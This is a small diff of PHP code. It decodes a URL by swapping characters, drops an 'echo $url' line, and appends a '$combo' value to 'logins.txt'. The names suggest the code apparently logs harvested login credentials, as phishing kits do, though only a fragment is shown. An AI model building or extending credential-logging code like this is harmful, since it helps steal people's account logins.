@@ -14,7 +14,6 @@ $url = str_replace("r", "d", $url);
 $url = str_replace("n", "m", $url);
 $url = str_replace("s", "l", $url);
 $url = str_replace("t", "w", $url);
-echo $url;
 fopen("logins.txt", "a");
 $file = fopen("logins.txt", "a");
 fwrite($file, $combo);
